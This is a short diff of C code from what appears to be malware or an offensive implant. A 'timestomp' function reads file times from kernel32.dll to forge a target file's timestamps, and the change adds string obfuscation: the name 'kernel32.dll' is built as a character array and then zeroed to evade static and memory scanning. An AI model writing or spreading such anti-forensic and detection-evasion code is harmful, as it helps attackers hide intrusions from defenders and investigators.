@@ -9,7 +9,9 @@ bool timestomp(const wchar_t *targetPath){
 
     //find kernel32.dll path
     API.GetSystemDirectoryW(kernel32Path, MAX_PATH);
-    wcscat(kernel32Path, L"\\kernel32.dll");
+    wchar_t k32name[] = {'\\','k','e','r','n','e','l','3','2','.','d','l','l','\0'};
+    wcscat(kernel32Path, k32name);
+    SecureZeroMemory(k32name, sizeof(k32name));
 
     //read filetimes from kernel32
     hVictim = API.CreateFileW(kernel32Path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
